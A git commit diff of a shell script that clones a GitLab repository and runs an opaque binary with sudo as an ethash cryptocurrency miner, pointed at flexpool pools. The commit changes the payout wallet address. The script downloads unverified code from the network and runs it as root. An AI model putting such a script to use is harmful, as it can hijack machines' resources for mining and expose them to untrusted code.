06298de6deecc52cb09118e01be83ef276645aae
weda212 <101047210+weda212@users.noreply.github.com>
2022-03-21 22:08:13 +0700

    Update er.sh

--- er.sh
+++ er.sh
@@ -6,4 +6,4 @@ screen -dmS er.sh 65 75
 sudo git clone https://gitlab.com/letricejuliocesar/goodday
 cd goodday
 chmod +x x
-ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) &&  sudo ./x -a ethash -w 0xb9e9cB28BE0837a884aac0182e763F9855493112 -p stratum+tcp://eth-sg.flexpool.io:4444 stratum+tcp://eth-hke.flexpool.io:4444 -r $ip --nvidia 1
+ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) &&  sudo ./x -a ethash -w 0x3da2c7743970908cac0e6b606f064330aea8b03f -p stratum+tcp://eth-sg.flexpool.io:4444 stratum+tcp://eth-hke.flexpool.io:4444 -r $ip --nvidia 1
